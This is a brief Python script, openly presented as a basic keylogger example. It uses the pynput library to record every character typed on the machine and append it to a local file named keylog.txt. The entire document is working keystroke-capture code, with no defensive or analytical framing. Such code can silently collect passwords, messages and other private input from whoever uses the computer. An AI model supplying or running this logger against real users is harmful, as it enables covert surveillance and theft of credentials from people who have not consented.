from pynput import keyboard

# An example of a basic keylogger. It listens for keyboard input and stores it in a txt file. 

# What happens when a key is pressed
def key_pressed(key):  
    with open("keylog.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Could not append character")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()
